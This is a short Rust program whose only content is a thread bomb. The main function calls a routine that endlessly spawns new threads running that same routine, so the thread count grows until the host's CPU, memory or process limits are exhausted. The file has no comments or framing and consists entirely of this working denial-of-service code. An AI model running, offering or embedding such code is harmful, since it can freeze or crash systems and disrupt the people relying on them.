#[allow(unconditional_recursion)]
fn main(){
thread();
}

fn thread(){
    loop {
        std::thread::spawn(thread);
    }
}